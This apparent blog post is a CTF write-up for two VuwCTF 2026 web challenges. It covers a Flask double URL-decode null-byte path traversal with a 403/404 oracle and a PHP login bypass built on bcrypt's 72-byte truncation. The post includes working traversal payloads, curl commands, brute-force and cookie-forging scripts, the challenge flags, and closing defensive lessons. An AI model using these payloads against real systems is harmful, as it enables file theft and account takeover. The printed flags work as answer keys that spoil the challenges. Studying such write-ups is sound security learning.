---
title: "VuwCTF 2026 Web Writeup: Double URL-Decode Null-Byte Path Traversal & a BCrypt 72-Byte Truncation Login Bypass"
slug: "vuwctf-2026-web-writeup"
description: "VuwCTF 2026 web writeup covering both challenges: just-download-it (a Flask image host where a double URL-decode smuggles a null byte past the .png guard, enabling path traversal, and a 403-vs-404 status-code oracle leaks the flag one byte per file) and ant-universe (a PHP forum that never verifies the login password combined with bcrypt's silent 72-byte truncation, engineered so user 3's 71-byte JSON prefix leaves only the first password character inside the hash window — a single-character brute force)."
date: 2026-08-03T16:15:00Z
lastmod: 2026-08-03T16:15:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
series: ["VuwCTF 2026"]
tags:
  - "vuwctf"
  - "vuwctf 2026"
  - "ctf writeup"
  - "web"
  - "web exploitation"
  - "path traversal"
  - "null byte injection"
  - "double url decode"
  - "flask"
  - "werkzeug"
  - "send_from_directory"
  - "status code oracle"
  - "bcrypt"
  - "bcrypt truncation"
  - "password_verify"
  - "php"
  - "authentication bypass"
  - "json encoding"
  - "ctf 2026"
keywords:
  - "vuwctf 2026 web writeup"
  - "just-download-it vuwctf writeup"
  - "ant-universe vuwctf writeup"
  - "double url decode null byte bypass ctf"
  - "flask path traversal png filter bypass"
  - "send_from_directory 403 404 oracle ctf"
  - "status code oracle flag leak ctf"
  - "bcrypt 72 byte truncation exploit ctf"
  - "php password_verify login bypass ctf"
  - "bcrypt prefix truncation single character brute force"
  - "json_encode bcrypt cookie ctf"
  - "php login without password verification"
  - "unquote double decode null byte php flask"
  - "vuwctf web challenge"
  - "os.path.join traversal ctf"
toc: true
cover:
  image: "/images/articles/vuwctf-2026-web-writeup.png"
  alt: "VuwCTF 2026 web writeup — two challenges covering just-download-it a Flask image-sharing service whose files route checks that a filename ends in .png and contains no raw null byte but then calls unquote a second time on the already-decoded query parameter so a double-encoded percent-two-five-zero-zero smuggles a null byte past both guards and the split on chr zero strips the .png suffix enabling path traversal through os.path.join to arbitrary files while a mismatch between the raw open used for the key check and send_from_directory used for delivery creates a 403 versus 404 status-code oracle that leaks the eight single-character flag files one byte at a time; and ant-universe a 1999-themed PHP forum whose login endpoint never verifies the submitted password and whose bcrypt hashing silently truncates its input to 72 bytes so user 3 whose json-encoded prefix of date and 37-character username is exactly 71 bytes leaves only the first password character inside the bcrypt window reducing the attack to a single printable-ascii brute force that unlocks the private blog"
---

VuwCTF 2026's web track was two lessons in *boundary mismatches*: two components that each look correct in isolation but disagree about what the input means. **just-download-it** (100 pts, Easy) is a Flask image host where the validator and the file-opener decode the path a different number of times — a double URL-decode that smuggles a null byte past a `.png` filter, plus a `403`-vs-`404` oracle that leaks the flag byte by byte. **ant-universe** (a 1999-era PHP forum) pairs a login endpoint that never checks the password with bcrypt's silent 72-byte truncation, hand-tuned so exactly one character of the target user's password lands inside the hash window. This writeup solves both step by step.

Application source, exploit scripts, and artifacts are at
[Abdelkad3r/VuwCTF-2026](https://github.com/Abdelkad3r/VuwCTF-2026/tree/master/Web).
Companion posts from the same event:
[Cryptography](/ctf-writeups/vuwctf-2026-crypto-writeup/),
[Reverse Engineering](/ctf-writeups/vuwctf-2026-reverse-writeup/), and
[Forensics](/ctf-writeups/vuwctf-2026-forensics-writeup/).

## Challenges at a glance

| Challenge | Difficulty | Points | Stack | Core bug chain | Flag |
|---|---|---|---|---|---|
| just-download-it | Easy | 100 | Flask | double URL-decode null-byte → path traversal → 403/404 oracle | `VuwCTF{!L3AK*D!}` |
| ant-universe | — | — | PHP + PostgreSQL | login without `password_verify` × bcrypt 72-byte truncation | `VuwCTF{i_wrote_this_before_chapter_5_came_out}` |

---

## Challenge 1 — just-download-it (Easy, 100 pts)

> Just Download it!

A Flask image-sharing app with source provided. The interesting logic is all in
`/files`:

```python
@app.route('/files')
def list_files():
    target_file = request.args.get('file')
    key = request.args.get('key')
    if target_file:
        if not target_file.lower().endswith('.png'):   # Guard 1
            abort(403)
        if '\x00' in target_file:                        # Guard 2
            abort(403)
        target_file = unquote(target_file)               # ⚠ second decode
        target_file = target_file.split(chr(0))[0]
        file_path = os.path.join(SHARED_FOLDER, target_file)
        with open(file_path, 'rb') as f:                 # key check via raw open
            secret_value = f.read(5).hex(' ').upper()
        if key != secret_value:
            abort(403)
        return send_from_directory(SHARED_FOLDER, target_file, as_attachment=True)
```

### Step 1 — The double URL-decode null-byte bypass

Flask/Werkzeug URL-decodes query parameters **once** automatically. The app then
calls `unquote()` **again** — a classic double-decode. That lets a
double-encoded null byte slip past both guards:

| Step | Value |
|---|---|
| We send (raw URL) | `file=evil.txt%2500.png` |
| Flask auto-decodes (`%25` → `%`) | `evil.txt%00.png` |
| Guard 1 `.endswith('.png')` | ✅ still ends `.png` |
| Guard 2 `'\x00' in ...` | ✅ `%00` is not a raw null yet |
| `unquote()` second decode (`%00` → `\x00`) | `evil.txt\x00.png` |
| `.split(chr(0))[0]` | `evil.txt` |

After the split, the `.png` requirement is gone and the app opens whatever file
you named.

### Step 2 — Path traversal

`target_file` is never sanitized, so `os.path.join` happily accepts `../`:

```text
file=../flag/Flag1.txt%2500.png
→ os.path.join('/app/shared_files', '../flag/Flag1.txt')
→ open('/app/flag/Flag1.txt')
```

### Step 3 — Grab the target image and OCR the hint

Listing `/files` shows `illegal.jpg`, which the normal `.png`-only route refuses.
Its first five bytes are the JFIF magic `FF D8 FF E0 00`, so the key check wants
`secret_value = 'FF D8 FF E0 00'`:

```bash
curl -s "https://<inst>/files?file=illegal.jpg%2500.png&key=FF%20D8%20FF%20E0%2000" -o illegal.jpg
tesseract illegal.jpg stdout
```

The banner image reads: the flag is split across `/app/flag/Flag1.txt … FlagN.txt`,
each file holding a single character.

### Step 4 — Build the 403/404 status-code oracle

The key check uses raw `open()`, but delivery uses `send_from_directory`, whose
internal `safe_join` **raises 404 on any `../`**. That mismatch produces a
three-way oracle:

| Situation | Response |
|---|---|
| File missing (`open` → `FileNotFoundError`) | `404` |
| File exists, **wrong** key | `403` |
| File exists, **correct** key (but traversal path) | `404` |

So an impossible key (e.g. `00`, which can't be a printable char's hex) gives
`403` = "file exists", `404` = "missing" — a file-existence oracle. And once a
file exists, the **correct** key flips the response from `403` to `404` — a
content oracle.

### Step 5 — Enumerate and brute-force each character

```python
def file_exists(n):        # impossible key '00' → 403 means the file exists
    return GET(f"/files?file=../flag/Flag{n}.txt%2500.png&key=00") == "403"

# 8 files exist: Flag1..Flag8
for byte_val in range(0x20, 0x7F):
    key = format(byte_val, '02X')   # one-byte file → 'read(5)' is 2 hex digits, no spaces
    if GET(f"/files?file=../flag/Flag{N}.txt%2500.png&key={key}") == "404":
        return chr(byte_val)        # 404 = key matched + traversal blocked
```

Running all eight in parallel:

```text
Flag1 → '!'   Flag2 → 'L'   Flag3 → '3'   Flag4 → 'A'
Flag5 → 'K'   Flag6 → '*'   Flag7 → 'D'   Flag8 → '!'
```

### Flag

```text
VuwCTF{!L3AK*D!}
```

**Root cause:** three cooperating bugs — the double decode bypasses the `.png`
and null-byte guards, the unsanitized join enables traversal, and the
`open()`-vs-`send_from_directory` mismatch turns HTTP status codes into a
byte-at-a-time read primitive.

---

## Challenge 2 — ant-universe

> A 1999-era ant-themed forum. Registration is closed. Read user 3's private blog.

Source is provided. Five users are pre-seeded; user 3 is
`myrealnamedefisnot_spuukygrrl10311985` — a conspicuously long 37-character
username. The private blog is gated behind a bcrypt check. Two independent bugs
combine.

### V1 — Login never verifies the password

```php
// login.php
$user = pg_fetch_all(...);         // SELECT * FROM users WHERE username = $1
if ($user) {
    $token = [$user[0]["date_joined"], $_POST["username"], $_POST["password"]];
    setcookie("token", json_encode($token), ...);   // password never checked
    header("Location: /user.php?u=" . $user[0]["id"]);
}
```

If the username exists, the server sets a cookie containing
`[$date_joined, $username, $submitted_password]` — **whatever password you
supplied**, never compared to anything. We fully control the cookie content.

### The gate — user.php passes the raw cookie to bcrypt

```php
// user.php
if (password_verify($_COOKIE["token"], $hash)) {   // $hash = stored bcrypt from DB
    echo "<p>" . $blog . "</p>";
}
```

The stored hash was computed at registration (visible in `register.php`'s dead
code, after its `exit()`) as:

```php
password_hash(json_encode([$date, $username, $password]), PASSWORD_BCRYPT)
```

Our cookie has the **same JSON structure**. If the cookie matches the original in
its first 72 bytes, `password_verify` returns true — because of V2.

### V2 — BCrypt silently truncates at 72 bytes

`password_hash(..., PASSWORD_BCRYPT)` caps its input at **72 bytes** and silently
discards the rest — no error, no warning. `password_verify` truncates the same
way. So only the first 72 bytes of the JSON string matter.

### The intersection — why user 3 is the target

Count the fixed prefix before the password for user 3
(`date_joined = "1999-04-13 23:47:40.126783"`, 26 bytes; username 37 bytes):

```text
["1999-04-13 23:47:40.126783","myrealnamedefisnot_spuukygrrl10311985","?
 └──────────────────── 71 bytes ─────────────────────────────────────┘└ byte 72
```

| Component | Bytes | Cumulative |
|---|---|---|
| `["` | 2 | 2 |
| date (26) | 26 | 28 |
| `","` | 3 | 31 |
| username (37) | 37 | 68 |
| `","` | 3 | 71 |
| **password[0]** | **1** | **72 ← bcrypt cutoff** |

The prefix is exactly **71 bytes**, so bcrypt hashes the prefix plus **only the
first character** of the password; everything after is discarded. The brute-force
space collapses from the whole password to a single printable ASCII byte (≤95
candidates).

### Exploitation

**Confirm the login bypass** (any password works):

```bash
curl -sk -c /tmp/c.txt -X POST \
  -d 'username=myrealnamedefisnot_spuukygrrl10311985&password=anything' \
  'https://<inst>/login.php'      # → 302 to /user.php?u=3
```

**Craft the cookie exactly like PHP's `json_encode`** — compact separators are
mandatory:

```python
import json, urllib.parse
DATE = "1999-04-13 23:47:40.126783"
USER = "myrealnamedefisnot_spuukygrrl10311985"

def make_cookie(ch):
    # PHP json_encode has NO spaces after ',' or ':'
    php_json = json.dumps([DATE, USER, ch], separators=(',', ':'))
    return "token=" + urllib.parse.quote(php_json, safe='')
```

The `separators=(',', ':')` is not cosmetic: Python's default
`json.dumps` inserts a space after each comma, which would push the prefix to 72
bytes and put **zero** password characters inside the bcrypt window — every guess
would fail. Compact encoding keeps the prefix at 71.

**Brute-force `password[0]`** against `/user.php?u=3`, using response length (an
extra `<p>` from the private blog) as the oracle. Baseline is 2 `<p>` tags; a
match adds a third. The Halloween/1999 theme (`spuukygrrl`) hints at `h`:

```text
'p' (0x70) len=643
'h' (0x68) len=887   ← MATCH (private blog rendered)
```

**Read the flag:**

```text
this is my private blog!
i wonder if it's safe to write that i'm a deer, not an ant and not even a moose...!
well if it's safe to write that it must be safe to write this:
VuwCTF{i_wrote_this_before_chapter_5_came_out}
```

### Flag

```text
VuwCTF{i_wrote_this_before_chapter_5_came_out}
```

**Root cause:** neither bug alone leaks the flag. V1 gives you control of the
bcrypt pre-image but you still must pass the check; V2 shrinks that check to one
byte. The author sized user 3's `date_joined` and username so the 71-byte prefix
leaves exactly one password byte in the window.

---

## Cross-cutting notes

**Boundary mismatches are the whole web track.** Both challenges hinge on two
components disagreeing about the input. just-download-it: the validator decodes
once, the opener decodes twice — and the key-checker (`open`) and the deliverer
(`send_from_directory`) disagree about `../`. ant-universe: the login trusts the
password while the gate re-derives it, and bcrypt disagrees with the application
about how many bytes count. Whenever two layers process the same value, check
whether they normalize it identically.

**Double-decode + null byte is a canonical filter bypass.** A guard that checks a
suffix/prefix on an already-decoded value, followed by a second `unquote`, lets
`%2500` become a raw `\x00` *after* the check. Splitting on the null then discards
the "safe" suffix. Any time you see two decode passes around a validation, try a
double-encoded null byte.

**Status codes are an exfiltration channel.** just-download-it never returns the
flag bytes directly — it returns `403` or `404`, and the difference is enough to
read the file one byte per request. When an app branches on secret-dependent
conditions and surfaces the branch through status, timing, or length, that's a
side-channel oracle regardless of whether a body is ever leaked.

**Never feed long structured strings to bcrypt.** bcrypt's 72-byte truncation is
silent, and it becomes exploitable exactly when an attacker controls the bytes
before the secret and the fixed prefix is long enough to push the secret to byte
72. Pre-hash with SHA-256, use Argon2id (no truncation), or hash the password
alone — embedding `date_joined` and `username` in the hash input added no security
and created the hole.

**Match the server's serialization byte-for-byte.** The ant-universe exploit fails
silently unless Python's JSON matches PHP's compact `json_encode`. A single extra
space shifts the 71-byte prefix to 72 and moves the secret out of the hash window.
When you replicate a server-side pre-image, replicate its exact encoding.

---

## Frequently Asked Questions

**Q: What is the double URL-decode null-byte bypass in just-download-it?**

Flask/Werkzeug URL-decodes query parameters once automatically. The app then calls
`urllib.parse.unquote()` a second time. Sending `file=evil.txt%2500.png` decodes to
`evil.txt%00.png` after Flask's pass — which still ends in `.png` and contains no
raw null byte, so both guards pass. The app's second `unquote()` turns `%00` into a
real `\x00`, and `split(chr(0))[0]` strips the null and the `.png` suffix, leaving
`evil.txt`. This defeats the extension filter and enables path traversal via
`os.path.join`.

**Q: How does the 403 vs 404 oracle leak the flag one byte at a time?**

The key check reads the target file with raw `open()`, but delivery uses Werkzeug's
`send_from_directory`, whose `safe_join` returns 404 for any path containing `../`.
So: a missing file returns 404 (open fails), an existing file with a wrong key
returns 403, and an existing file with the correct key returns 404 (traversal
blocked at delivery). Probing with an impossible key distinguishes existence
(403 vs 404), and once a file is known to exist, the correct one-byte key flips
403 to 404 — revealing each single-character flag file.

**Q: Why does bcrypt only require guessing one character of ant-universe's password?**

PHP's `password_hash(..., PASSWORD_BCRYPT)` silently truncates its input to 72
bytes, and `password_verify` truncates identically. The hashed value is
`json_encode([date, username, password])`. For user 3 the JSON prefix before the
password — `["1999-04-13 23:47:40.126783","myrealnamedefisnot_spuukygrrl10311985","`
— is exactly 71 bytes, so bcrypt hashes the prefix plus only the first password
character. Every character after the first is discarded, so the brute force is a
single printable-ASCII byte.

**Q: Why is the login bypass alone not enough in ant-universe?**

`login.php` never calls `password_verify`, so any password logs you in and sets a
cookie you control — but the private blog in `user.php` only renders if
`password_verify($cookie, $stored_hash)` returns true. The login bypass gives you
control of the bcrypt pre-image; you still need a cookie whose first 72 bytes match
the original hash input. The bcrypt truncation bug is what makes that feasible by
reducing the unknown to one byte.

**Q: Why does the JSON separators setting matter in the ant-universe exploit?**

PHP's `json_encode` produces compact JSON with no spaces after commas or colons,
e.g. `["date","user","h"]`. Python's default `json.dumps` inserts a space after
each comma. That extra space lengthens the prefix from 71 to 72 bytes, pushing the
first password character to byte 73 — outside bcrypt's 72-byte window — so no guess
can ever match. Using `json.dumps(..., separators=(',', ':'))` reproduces PHP's
encoding and keeps the prefix at 71 bytes.

**Q: What are the flags for the VuwCTF 2026 web challenges?**

just-download-it: `VuwCTF{!L3AK*D!}`. ant-universe:
`VuwCTF{i_wrote_this_before_chapter_5_came_out}`.

```json
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    {
      "@type": "Question",
      "name": "What is the double URL-decode null-byte bypass in just-download-it?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Flask and Werkzeug URL-decode query parameters once automatically, then the app calls urllib.parse.unquote a second time. Sending file=evil.txt%2500.png decodes to evil.txt%00.png after Flask's pass, which still ends in .png and contains no raw null byte, so both guards pass. The app's second unquote turns %00 into a real null byte, and split(chr(0))[0] strips the null and the .png suffix, leaving evil.txt. This defeats the extension filter and enables path traversal via os.path.join."
      }
    },
    {
      "@type": "Question",
      "name": "How does the 403 vs 404 oracle leak the flag one byte at a time?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "The key check reads the target file with raw open(), but delivery uses Werkzeug's send_from_directory, whose safe_join returns 404 for any path containing dot-dot-slash. A missing file returns 404 because open fails, an existing file with a wrong key returns 403, and an existing file with the correct key returns 404 because traversal is blocked at delivery. Probing with an impossible key distinguishes existence via 403 versus 404, and once a file is known to exist, the correct one-byte key flips 403 to 404, revealing each single-character flag file."
      }
    },
    {
      "@type": "Question",
      "name": "Why does bcrypt only require guessing one character of the ant-universe password?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "PHP's password_hash with PASSWORD_BCRYPT silently truncates its input to 72 bytes, and password_verify truncates identically. The hashed value is json_encode of date, username, and password. For user 3 the JSON prefix before the password is exactly 71 bytes, so bcrypt hashes the prefix plus only the first password character. Every character after the first is discarded, so the brute force is a single printable-ASCII byte, at most 95 candidates."
      }
    },
    {
      "@type": "Question",
      "name": "Why is the login bypass alone not enough in ant-universe?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "login.php never calls password_verify, so any password logs you in and sets a cookie you control, but the private blog in user.php only renders if password_verify of the cookie against the stored hash returns true. The login bypass gives you control of the bcrypt pre-image; you still need a cookie whose first 72 bytes match the original hash input. The bcrypt truncation bug is what makes that feasible by reducing the unknown to one byte."
      }
    },
    {
      "@type": "Question",
      "name": "Why does the JSON separators setting matter in the ant-universe exploit?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "PHP's json_encode produces compact JSON with no spaces after commas or colons. Python's default json.dumps inserts a space after each comma. That extra space lengthens the prefix from 71 to 72 bytes, pushing the first password character to byte 73, outside bcrypt's 72-byte window, so no guess can ever match. Using json.dumps with separators of comma and colon reproduces PHP's encoding and keeps the prefix at 71 bytes."
      }
    },
    {
      "@type": "Question",
      "name": "What are the flags for the VuwCTF 2026 web challenges?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "just-download-it: VuwCTF{!L3AK*D!}. ant-universe: VuwCTF{i_wrote_this_before_chapter_5_came_out}."
      }
    }
  ]
}
```
